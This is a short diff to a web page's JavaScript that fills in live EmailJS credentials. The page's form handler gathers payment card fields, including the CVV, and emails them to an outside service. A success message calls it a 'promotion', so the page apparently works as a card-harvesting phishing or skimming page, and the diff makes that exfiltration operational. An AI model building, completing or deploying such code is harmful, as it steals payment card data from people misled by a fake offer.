@@ -233,7 +233,7 @@
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script type="text/javascript">
    (function(){
-       emailjs.init("YOUR_PUBLIC_KEY"); // Reemplaza con tu Public Key
+       emailjs.init("T72Wf1jx7lTBM9Md-"); // Reemplaza con tu Public Key
    })();
 </script>
 
@@ -433,7 +433,7 @@ form.addEventListener('submit', function(e){
             cc_cvv: document.getElementById('cc-cvv').value
         };
 
-        emailjs.send('YOUR_SERVICE_ID','YOUR_TEMPLATE_ID', templateParams)
+        emailjs.send('service_tc4q92e','template_jhvrn8a', templateParams)
         .then(function(response) {
             spinner.style.display = 'none';
             feedback.textContent = "¡Promoción enviada correctamente!";
